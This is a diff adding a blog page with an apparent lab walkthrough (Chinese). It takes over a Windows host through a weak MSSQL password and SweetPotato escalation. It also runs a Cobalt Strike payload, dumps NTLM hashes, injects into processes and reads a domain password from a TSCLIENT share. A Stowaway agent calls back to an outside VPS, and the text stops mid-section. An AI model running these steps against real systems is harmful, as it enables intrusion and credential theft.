@@ -1,0 +1,1484 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" Tsclient 外网 mssql弱口令（MDUT执行命令） fscan扫出一个mssql弱口令\nMDUT连接一下（下载地址：MDUT-Extend(扩展版本)Multiple Database Utilization Tools Extend - 🔰雨苁ℒ🔰）\n">
+<title>Tsclient</title>
+
+<link rel='canonical' href='https://luo-kaihong.github.io/p/tsclient/'>
+
+<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="Tsclient">
+<meta property='og:description' content=" Tsclient 外网 mssql弱口令（MDUT执行命令） fscan扫出一个mssql弱口令\nMDUT连接一下（下载地址：MDUT-Extend(扩展版本)Multiple Database Utilization Tools Extend - 🔰雨苁ℒ🔰）\n">
+<meta property='og:url' content='https://luo-kaihong.github.io/p/tsclient/'>
+<meta property='og:site_name' content='zhizuijimi'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-12-22T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-12-22T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="Tsclient">
+<meta name="twitter:description" content=" Tsclient 外网 mssql弱口令（MDUT执行命令） fscan扫出一个mssql弱口令\nMDUT连接一下（下载地址：MDUT-Extend(扩展版本)Multiple Database Utilization Tools Extend - 🔰雨苁ℒ🔰）\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_a4e3a2ed64404d6b.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💗</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">zhizuijimi</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://mpbeta.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.10336'
+                        target="_blank"
+                        title="csdn"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" ?><!DOCTYPE svg  PUBLIC '-//W3C//DTD SVG 1.1//EN'  'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'><svg enable-background="new 0 0 156.457 156.457" height="156.457" id="Layer_1" overflow="visible" version="1.1" viewBox="0 0 156.457 156.457" width="156.457" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="icon"><circle cx="78.229" cy="78.229" fill="#EF7A2B" r="78.229"/><path d="M64.616,117.315c-9.653-0.584-16.453-4.751-19.793-12.154c-1.493-3.292-2.118-6.459-2.153-10.876   c-0.021-2.306,0.403-27.915,0.549-33.193c0.146-5.563,1.188-9.532,3.424-13.019c3.174-4.969,7.667-7.785,14.265-8.879   c2.542-0.424,24.8-0.875,26.96-0.521c5.001,0.827,8.932,2.858,12.224,6.306c2.694,2.823,4.444,6.236,5.257,10.271   c0.563,2.816,0.625,9.584,0.104,12.345c-0.194,0.983-0.223,1.386-0.104,1.386c0.091,0,0.868,0.066,1.716,0.149   c3.403,0.319,5.966,1.132,7.91,2.503c3.396,2.389,5,5.661,5.368,10.928c0.223,3.098,0.181,11.348-0.055,13.293   c-0.792,6.25-2.952,10.979-6.765,14.778c-3.577,3.57-7.737,5.57-13.522,6.501c-1.306,0.208-3.326,0.236-17.467,0.264   C73.735,117.412,65.672,117.371,64.616,117.315L64.616,117.315L64.616,117.315z M99.202,99.036   c1.285-0.334,2.153-0.819,3.091-1.765c2.188-2.194,2.632-5.319,1.16-8.209c-0.417-0.813-1.64-2.027-2.584-2.556   c-1.659-0.931-0.902-0.889-19.335-0.889c-14.862,0-16.786,0.021-17.612,0.223c-3.07,0.757-5.139,3.417-5.139,6.598   c0,1.938,0.66,3.535,2.021,4.868c0.931,0.91,1.632,1.326,2.896,1.688c0.785,0.229,2.097,0.25,17.745,0.264   C96.376,99.258,98.438,99.237,99.202,99.036L99.202,99.036z M85.841,67.988c0.444-0.167,1.139-0.552,1.541-0.854   c4.438-3.333,3.334-10.125-1.958-12.008c-0.569-0.205-1.515-0.267-5.376-0.368c-8.25-0.208-13.695-0.188-14.445,0.052   c-1.194,0.385-2.167,0.972-2.965,1.785c-3.57,3.615-2.167,9.55,2.667,11.275c0.729,0.264,1.34,0.302,6.424,0.417   C83.465,68.551,84.382,68.533,85.841,67.988L85.841,67.988L85.841,67.988z" fill="#FFFFFF"/></g></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#外网">外网</a>
+      <ol>
+        <li><a href="#mssql弱口令mdut执行命令">mssql弱口令（MDUT执行命令）</a></li>
+        <li><a href="#sweetpotato提权">SweetPotato提权</a></li>
+        <li><a href="#上线cs">上线cs</a></li>
+        <li><a href="#cs注入在线用户进程上线">CS注入在线用户进程上线</a></li>
+      </ol>
+    </li>
+    <li><a href="#内网">内网</a>
+      <ol>
+        <li><a href="#stowaway搭建代理">Stowaway搭建代理</a></li>
+        <li><a href="#密码喷洒攻击">密码喷洒攻击</a></li>
+        <li><a href="#impacket-changepasswd修改密码">impacket-changepasswd修改密码</a></li>
+        <li><a href="#映像劫持提权-放大镜提权">映像劫持提权-放大镜提权</a></li>
+        <li><a href="#不出网转发上线cs"><strong>不出网转发上线CS</strong></a></li>
+        <li><a href="#mimikatz进行hash传递攻击">mimikatz进行hash传递攻击</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F/" style="background-color: #00ff00; color: #fff;">
+                渗透
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/tsclient/">Tsclient</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-12-22</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 6 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <hr>
+<h1 id="tsclient"><strong>Tsclient</strong>
+</h1><h2 id="外网">外网
+</h2><h3 id="mssql弱口令mdut执行命令">mssql弱口令（MDUT执行命令）
+</h3><p>fscan扫出一个mssql弱口令</p>
+<p><img src="/p/tsclient/image-20251222142731315.png"
+	width="1084"
+	height="406"
+	srcset="/p/tsclient/image-20251222142731315_hu_34bb45e6c76a8bed.png 480w, /p/tsclient/image-20251222142731315_hu_6fb71908889bf1b6.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251222142731315"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="266"
+		data-flex-basis="640px"
+	
+></p>
+<p>MDUT连接一下（下载地址：<a class="link" href="https://www.ddosi.org/mdut/"  target="_blank" rel="noopener"
+    >MDUT-Extend(扩展版本)Multiple Database Utilization Tools Extend - 🔰雨苁ℒ🔰</a>）</p>
+<img src="image-20251222143031876.png" alt="image-20251222143031876" style="zoom:50%;" />
+<p>激活组件后就可以执行命令</p>
+<img src="image-20251222150825119.png" alt="image-20251222150825119" style="zoom:50%;" />
+<h3 id="sweetpotato提权">SweetPotato提权
+</h3><p>权限较低，上传文件SweetPotato.exe去提权</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:/Users/Public/Sweetpotato.exe -a whoami
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20251222151444259.png" alt="image-20251222151444259" style="zoom:50%;" />
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:/Users/Public/Sweetpotato.exe -a &#34;type C:\Users\Administrator\flag\flag01.txt&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20251222151702275.png" alt="image-20251222151702275" style="zoom:50%;" />
+<h3 id="上线cs">上线cs
+</h3><p>参考：<a class="link" href="https://blog.csdn.net/m0_60571842/article/details/132920672"  target="_blank" rel="noopener"
+    >CobaltStrike4.8汉化版带插件-CSDN博客</a></p>
+<p>服务端运行起来</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./teamserver 101.200.39.193 111111
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/tsclient/image-20251222153529570.png"
+	width="944"
+	height="474"
+	srcset="/p/tsclient/image-20251222153529570_hu_ad486cae752aaa17.png 480w, /p/tsclient/image-20251222153529570_hu_5367b253991f172a.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251222153529570"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="199"
+		data-flex-basis="477px"
+	
+></p>
+<p>本地电脑使用客户端连接一下（要关vpn），主要输入<code>HOST、Port、password</code>即可，然后开始上线</p>
+<img src="image-20251222154030634.png" alt="image-20251222154030634" style="zoom:50%;" />
+<p>新建一个监听, 然后以这个监听生成一个🐎，然后上传CS的🐎, 把CS给上线, 用提权的命令执行, 这样上线后的CS也是system权限了。</p>
+<p>这里监听端口注意是vps空闲且开了安全组的端口</p>
+<img src="image-20251222154758395.png" alt="image-20251222154758395" style="zoom:50%;" />
+<p><img src="/p/tsclient/image-20260109153716664.png"
+	width="538"
+	height="230"
+	srcset="/p/tsclient/image-20260109153716664_hu_50d665a1b549f680.png 480w, /p/tsclient/image-20260109153716664_hu_45c5115caf6369ce.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109153716664"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="233"
+		data-flex-basis="561px"
+	
+></p>
+<img src="image-20260109153640047.png" alt="image-20260109153640047" style="zoom:50%;" />
+<p>将生成的马上传,然后用土豆提权运行，得到的是system权限</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:/Users/Public/Sweetpotato.exe -a &#34;C:/Users/Public/cs.exe&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上线成功</p>
+<p><img src="/p/tsclient/image-20260109154717509.png"
+	width="1121"
+	height="643"
+	srcset="/p/tsclient/image-20260109154717509_hu_d7776c7dd9afa080.png 480w, /p/tsclient/image-20260109154717509_hu_1aaa68253517ffce.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109154717509"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="174"
+		data-flex-basis="418px"
+	
+></p>
+<p>查看一一下用户</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell net user
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20260109160030859.png" alt="image-20260109160030859"  />
+<p>直接<code>hashdump</code> , 抓一下密码hash值, 毕竟现在是system的账户权限</p>
+<p><img src="/p/tsclient/image-20260109160813543.png"
+	width="738"
+	height="190"
+	srcset="/p/tsclient/image-20260109160813543_hu_745cdb3dec1231d5.png 480w, /p/tsclient/image-20260109160813543_hu_e4c034d4a2842f83.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109160813543"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="388"
+		data-flex-basis="932px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:2caf35bb4c5059a3d50599844e2b9b1f:::
+</span></span><span class="line"><span class="cl">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">John:1008:aad3b435b51404eeaad3b435b51404ee:eec9381b043f098b011be51622282027:::
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是cs好像可以直接看</p>
+<p><img src="/p/tsclient/image-20260109161408400.png"
+	width="1913"
+	height="447"
+	srcset="/p/tsclient/image-20260109161408400_hu_3f7d013dd1fda7b3.png 480w, /p/tsclient/image-20260109161408400_hu_b249a46bcbb4c4c7.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109161408400"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="427"
+		data-flex-basis="1027px"
+	
+></p>
+<h3 id="cs注入在线用户进程上线">CS注入在线用户进程上线
+</h3><p>查看一下在线用户 , 可以发现有john的用户在线, 那么可以用CS直接注入进程上线</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell quser || qwinst
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/tsclient/image-20260109161006296.png"
+	width="665"
+	height="132"
+	srcset="/p/tsclient/image-20260109161006296_hu_9eab67bdbcf5a899.png 480w, /p/tsclient/image-20260109161006296_hu_253a89a7eaef2b8c.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109161006296"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="503"
+		data-flex-basis="1209px"
+	
+></p>
+<p>查看进程列表, 选择john用户的进程进行注入</p>
+<p><img src="/p/tsclient/image-20260109161631328.png"
+	width="1036"
+	height="366"
+	srcset="/p/tsclient/image-20260109161631328_hu_4c839d91b2b6c5ab.png 480w, /p/tsclient/image-20260109161631328_hu_d2002f3092d9bc1.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109161631328"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="283"
+		data-flex-basis="679px"
+	
+></p>
+<p>随便选择一个john的进程进行inject就行了</p>
+<p><img src="/p/tsclient/image-20260109161917661.png"
+	width="1601"
+	height="484"
+	srcset="/p/tsclient/image-20260109161917661_hu_3b4bf06a13b55b02.png 480w, /p/tsclient/image-20260109161917661_hu_698b84f98e2fcfe6.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109161917661"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="330"
+		data-flex-basis="793px"
+	
+></p>
+<p>发现成功上线</p>
+<p><img src="/p/tsclient/image-20260109162014497.png"
+	width="1773"
+	height="406"
+	srcset="/p/tsclient/image-20260109162014497_hu_7c5f729841642fa5.png 480w, /p/tsclient/image-20260109162014497_hu_a63969d9391b2c92.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109162014497"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="436"
+		data-flex-basis="1048px"
+	
+></p>
+<p>用John查看共享资源</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell net use 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/tsclient/image-20260109162222486.png"
+	width="663"
+	height="223"
+	srcset="/p/tsclient/image-20260109162222486_hu_c3bccf019c142813.png 480w, /p/tsclient/image-20260109162222486_hu_18d2af5b1b5c51e9.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109162222486"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="297"
+		data-flex-basis="713px"
+	
+></p>
+<p>查看一下共享的文件里面的内容</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell dir \\TSCLIENT\C
+</span></span><span class="line"><span class="cl">shell type \\TSCLIENT\C\credential.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/tsclient/image-20260109162527725.png"
+	width="601"
+	height="353"
+	srcset="/p/tsclient/image-20260109162527725_hu_cd0426fc2dacf7e4.png 480w, /p/tsclient/image-20260109162527725_hu_7ccc114f510ce7dd.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109162527725"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="170"
+		data-flex-basis="408px"
+	
+></p>
+<p><img src="/p/tsclient/image-20260109162629390.png"
+	width="663"
+	height="151"
+	srcset="/p/tsclient/image-20260109162629390_hu_25569bfcd8215969.png 480w, /p/tsclient/image-20260109162629390_hu_79a9a2587b6fdac.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109162629390"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="439"
+		data-flex-basis="1053px"
+	
+></p>
+<p>可以找到一个域用户的用户名和密码 , 并且提示了镜像劫持</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="内网">内网
+</h2><h3 id="stowaway搭建代理">Stowaway搭建代理
+</h3><p>vps运行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./linux_x64_admin -l 12345 -s 123456
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>靶机运行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell C:/Users/Public/win_agent.exe -c 101.200.39.193:12345 -s 123456 --reconnect 8
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>隧道搭建成功</p>
+<p><img src="/p/tsclient/image-20260109171027138.png"
+	width="1622"
+	height="501"
+	srcset="/p/tsclient/image-20260109171027138_hu_f7070aa46cee3712.png 480w, /p/tsclient/image-20260109171027138_hu_cd9e5c25c296fc14.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109171027138"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="323"
+		data-flex-basis="777px"
+	
+></p>
+<p>在vps上依次执行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">use 0
+</span></span><span class="line"><span class="cl">socks 5555
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>内网访问，验证一下，嗯嗯没错了</p>
+<p><img src="/p/tsclient/image-20260109171217247.png"
+	width="1415"
+	height="237"
